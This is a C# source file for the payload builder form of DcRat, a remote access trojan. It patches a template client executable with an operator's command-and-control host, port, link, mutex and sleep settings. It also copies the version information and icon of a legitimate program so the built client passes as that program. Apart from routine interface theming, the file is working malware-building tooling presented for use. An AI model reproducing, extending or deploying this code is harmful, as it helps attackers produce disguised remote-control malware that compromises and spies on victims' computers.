using System;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Text;
using System.Windows.Forms;
using DcRat.Helper;
using DcRat.Properties;
using dnlib.DotNet;
using dnlib.DotNet.Emit;
using Toolbelt.Drawing;
using Vestris.ResourceLib;

namespace DcRat.ChildForms
{
    public partial class childFormBuilder : Form
    {
        public childFormBuilder()
        {
            InitializeComponent();
            SetTheme();
        }

        private bool previoustheme;
        private void updateUI_Tick(object sender, EventArgs e)
        {
            if (previoustheme != Settings.Default.darkTheme)
            {
                previoustheme = Settings.Default.darkTheme;
                SetTheme();
            }
        }
        private void SetTheme()
        {
            bool darkTheme = Settings.Default.darkTheme;

            Color colorSide = darkTheme ? Settings.Default.colorsidedark : Settings.Default.colorside;
            Color colorText = darkTheme ? Settings.Default.colortextdark : Settings.Default.colortext;

            BackColor = colorSide;
            ForeColor = colorText;

            groupBoxassembly.ForeColor = colorText;
            groupBoxipport.ForeColor = colorText;
            groupBoxothers.ForeColor = colorText;
            textBoxlink.BackColor = colorSide;
            textBoxlink.ForeColor = colorText;
            textBoxicon.BackColor = colorSide;
            textBoxicon.ForeColor = colorText;
            textBoxip.BackColor = colorSide;
            textBoxip.ForeColor = colorText;
            textBoxport.ForeColor = colorText;
            textBoxport.BackColor = colorSide;
            textBoxproduct.BackColor = colorSide;
            textBoxcompany.BackColor = colorSide;
            textBoxcopyright.BackColor = colorSide;
            textBoxdescription.BackColor = colorSide;
            textBoxfileversion.BackColor = colorSide;
            textBoxoriginalfilename.BackColor = colorSide;
            textBoxproductversion.BackColor = colorSide;
            textBoxtrademarks.BackColor = colorSide;
            textBoxproduct.ForeColor = colorText;
            textBoxcompany.ForeColor = colorText;
            textBoxcopyright.ForeColor = colorText;
            textBoxdescription.ForeColor = colorText;
            textBoxfileversion.ForeColor = colorText;
            textBoxoriginalfilename.ForeColor = colorText;
            textBoxproductversion.ForeColor = colorText;
            textBoxtrademarks.ForeColor = colorText;
            textBoxgroup.ForeColor = colorText;
            textBoxgroup.BackColor = colorSide;
            numericUpDownsleep.BackColor = colorSide;
            numericUpDownsleep.ForeColor = colorText;

        }

        private void toggleButtonip_MouseClick(object sender, MouseEventArgs e)
        {
            if (toggleButtonip.Checked)
            {
                textBoxlink.Enabled = true;
                textBoxip.Enabled = false;
                textBoxport.Enabled = false;
            }
            else
            {
                textBoxlink.Enabled = false;
                textBoxip.Enabled = true;
                textBoxport.Enabled = true;
            }
        }        

        private void toggleButtonicon_MouseClick(object sender, MouseEventArgs e)
        {
            if (toggleButtonicon.Checked)
            {
                textBoxicon.Enabled = true;
                buttonchoose.Enabled = true;
                pictureBoxicon.Enabled = true;
            }
            else
            {
                textBoxicon.Enabled = false;
                buttonchoose.Enabled = false;
                pictureBoxicon.Enabled = false;
            }
        }

        private void buttonchoose_Click(object sender, EventArgs e)
        {
            using (OpenFileDialog ofd = new OpenFileDialog())
            {
                ofd.Title = "Choose Icon";
                ofd.Filter = "Icons Files(*.exe;*.ico;)|*.exe;*.ico";
                ofd.Multiselect = false;
                if (ofd.ShowDialog() == DialogResult.OK)
                {
                    if (ofd.FileName.ToLower().EndsWith(".exe"))
                    {
                        string ico = GetIcon(ofd.FileName);
                        textBoxicon.Text = ico;
                        pictureBoxicon.ImageLocation = ico;
                    }
                    else
                    {
                        textBoxicon.Text = ofd.FileName;
                        pictureBoxicon.ImageLocation = ofd.FileName;
                    }
                }
            }
        }

        private string GetIcon(string path)
        {
            try
            {
                string tempFile = Path.GetTempFileName() + ".ico";
                using (FileStream fs = new FileStream(tempFile, FileMode.Create))
                {
                    IconExtractor.Extract1stIconTo(path, fs);
                }
                return tempFile;
            }
            catch { }
            return "";
        }

        private void toggleButtonassembly_MouseClick(object sender, MouseEventArgs e)
        {
            if (toggleButtonassembly.Checked)
            {
                buttonclone.Enabled = true;
                textBoxproduct.Enabled = true;
                textBoxdescription.Enabled = true;
                textBoxcompany.Enabled = true;
                textBoxcopyright.Enabled = true;
                textBoxtrademarks.Enabled = true;
                textBoxoriginalfilename.Enabled = true;
                textBoxproductversion.Enabled = true;
                textBoxfileversion.Enabled = true;
            }
            else
            {
                buttonclone.Enabled = false;
                textBoxproduct.Enabled = false;
                textBoxdescription.Enabled = false;
                textBoxcompany.Enabled = false;
                textBoxcopyright.Enabled = false;
                textBoxtrademarks.Enabled = false;
                textBoxoriginalfilename.Enabled = false;
                textBoxproductversion.Enabled = false;
                textBoxfileversion.Enabled = false;
            }
        }

        private void buttonclone_Click(object sender, EventArgs e)
        {
            using (var openFileDialog = new OpenFileDialog())
            {
                openFileDialog.Filter = "Executable (*.exe)|*.exe";
                if (openFileDialog.ShowDialog() == DialogResult.OK)
                {
                    var fileVersionInfo = FileVersionInfo.GetVersionInfo(openFileDialog.FileName);

                    textBoxoriginalfilename.Text = fileVersionInfo.InternalName ?? string.Empty;
                    textBoxdescription.Text = fileVersionInfo.FileDescription ?? string.Empty;
                    textBoxcompany.Text = fileVersionInfo.CompanyName ?? string.Empty;
                    textBoxproduct.Text = fileVersionInfo.ProductName ?? string.Empty;
                    textBoxcopyright.Text = fileVersionInfo.LegalCopyright ?? string.Empty;
                    textBoxtrademarks.Text = fileVersionInfo.LegalTrademarks ?? string.Empty;

                    var version = fileVersionInfo.FileMajorPart;
                    textBoxfileversion.Text = $"{fileVersionInfo.FileMajorPart.ToString()}.{fileVersionInfo.FileMinorPart.ToString()}.{fileVersionInfo.FileBuildPart.ToString()}.{fileVersionInfo.FilePrivatePart.ToString()}";
                    textBoxproductversion.Text = $"{fileVersionInfo.FileMajorPart.ToString()}.{fileVersionInfo.FileMinorPart.ToString()}.{fileVersionInfo.FileBuildPart.ToString()}.{fileVersionInfo.FilePrivatePart.ToString()}";
                }
            }
        }

        private readonly Random random = new Random();
        const string alphabet = "asdfghjklqwertyuiopmnbvcxz";

        public string getRandomCharacters()
        {
            var sb = new StringBuilder();
            for (int i = 1; i <= new Random().Next(10, 20); i++)
            {
                var randomCharacterPosition = random.Next(0, alphabet.Length);
                sb.Append(alphabet[randomCharacterPosition]);
            }
            return sb.ToString();
        }

        private void buttonbuild_Click(object sender, EventArgs e)
        {
            if (!toggleButtonip.Checked && (string.IsNullOrWhiteSpace(textBoxip.Text) || string.IsNullOrWhiteSpace(textBoxport.Text))) return;
            if (string.IsNullOrWhiteSpace(textBoxmutex.Text)) textBoxmutex.Text = getRandomCharacters();
            if (toggleButtonip.Checked && string.IsNullOrWhiteSpace(textBoxlink.Text)) return;
            if (string.IsNullOrWhiteSpace(textBoxgroup.Text)) textBoxgroup.Text = "Default";

            ModuleDefMD asmDef = null;
            try
            {
                using (asmDef = ModuleDefMD.Load(radioButtonnet40.Checked? @"Client/NET40/Client.exe" : @"Client/NET35/Client.exe"))
                using (SaveFileDialog saveFileDialog1 = new SaveFileDialog())
                {
                    saveFileDialog1.Filter = ".exe (*.exe)|*.exe";
                    saveFileDialog1.InitialDirectory = Application.StartupPath;
                    saveFileDialog1.OverwritePrompt = false;
                    saveFileDialog1.FileName = "Client";
                    if (saveFileDialog1.ShowDialog() == DialogResult.OK)
                    {
                        buttonbuild.Enabled = false;
                        WriteSettings(asmDef, saveFileDialog1.FileName);
                        asmDef.Write(saveFileDialog1.FileName);
                        asmDef.Dispose();
                        if (toggleButtonassembly.Checked)
                        {
                            WriteAssembly(saveFileDialog1.FileName);
                        }
                        if (toggleButtonicon.Checked && !string.IsNullOrEmpty(textBoxicon.Text))
                        {
                            IconInjector.InjectIcon(saveFileDialog1.FileName, textBoxicon.Text);
                        }
                        MessageBox.Show("Done!", "Builder", MessageBoxButtons.OK, MessageBoxIcon.Information);                        
                    }
                }
            }
            catch (Exception ex)
            {
                MessageBox.Show(ex.Message, "Builder", MessageBoxButtons.OK, MessageBoxIcon.Error);
                asmDef?.Dispose();

            }
            buttonbuild.Enabled = true;
        }

        private void WriteSettings(ModuleDefMD asmDef, string AsmName)
        {
            try
            {
                foreach (TypeDef type in asmDef.Types)
                {
                    asmDef.Assembly.Name = Path.GetFileNameWithoutExtension(AsmName);
                    asmDef.Name = Path.GetFileName(AsmName);
                    if (type.Name == "Program")
                        foreach (MethodDef method in type.Methods)
                        {
                            if (method.Body == null) continue;
                            for (int i = 0; i < method.Body.Instructions.Count(); i++)
                            {
                                if (method.Body.Instructions[i].OpCode == OpCodes.Ldstr)
                                {
                                    if (method.Body.Instructions[i].Operand.ToString() == "%Port%")
                                    {
                                        if (toggleButtonip.Checked)
                                        {
                                            method.Body.Instructions[i].Operand = "0";
                                        }
                                        else
                                        {
                                            method.Body.Instructions[i].Operand = textBoxport.Text;
                                        }
                                    }

                                    if (method.Body.Instructions[i].Operand.ToString() == "%Host%")
                                    {
                                        if (toggleButtonip.Checked)
                                        {
                                            method.Body.Instructions[i].Operand = "null";
                                        }
                                        else
                                        {
                                            method.Body.Instructions[i].Operand = textBoxip.Text;
                                        }
                                    }

                                    if (method.Body.Instructions[i].Operand.ToString() == "%Mutex%")
                                        method.Body.Instructions[i].Operand = textBoxmutex.Text;

                                    if (method.Body.Instructions[i].Operand.ToString() == "%Sleep%")
                                        method.Body.Instructions[i].Operand = numericUpDownsleep.Value.ToString();

                                    if (method.Body.Instructions[i].Operand.ToString() == "%Link%")
                                        if (toggleButtonip.Checked)
                                            method.Body.Instructions[i].Operand = textBoxlink.Text;
                                        else
                                            method.Body.Instructions[i].Operand = "";

                                    if (method.Body.Instructions[i].Operand.ToString() == "%Group%")
                                        method.Body.Instructions[i].Operand = textBoxgroup.Text;
                                }
                            }
                        }
                }
            }
            catch (Exception ex)
            {
                throw new ArgumentException("WriteSettings: " + ex.Message);
            }
        }

        private void WriteAssembly(string filename)
        {
            try
            {
                VersionResource versionResource = new VersionResource();
                versionResource.LoadFrom(filename);

                versionResource.FileVersion = textBoxfileversion.Text;
                versionResource.ProductVersion = textBoxproductversion.Text;
                versionResource.Language = 0;

                StringFileInfo stringFileInfo = (StringFileInfo)versionResource["StringFileInfo"];
                stringFileInfo["ProductName"] = textBoxproduct.Text;
                stringFileInfo["FileDescription"] = textBoxdescription.Text;
                stringFileInfo["CompanyName"] = textBoxcompany.Text;
                stringFileInfo["LegalCopyright"] = textBoxcopyright.Text;
                stringFileInfo["LegalTrademarks"] = textBoxtrademarks.Text;
                stringFileInfo["Assembly Version"] = versionResource.ProductVersion;
                stringFileInfo["InternalName"] = textBoxoriginalfilename.Text;
                stringFileInfo["OriginalFilename"] = textBoxoriginalfilename.Text;
                stringFileInfo["ProductVersion"] = versionResource.ProductVersion;
                stringFileInfo["FileVersion"] = versionResource.FileVersion;

                versionResource.SaveTo(filename);
            }
            catch (Exception ex)
            {
                throw new ArgumentException("Assembly: " + ex.Message);
            }
        }


    }
}
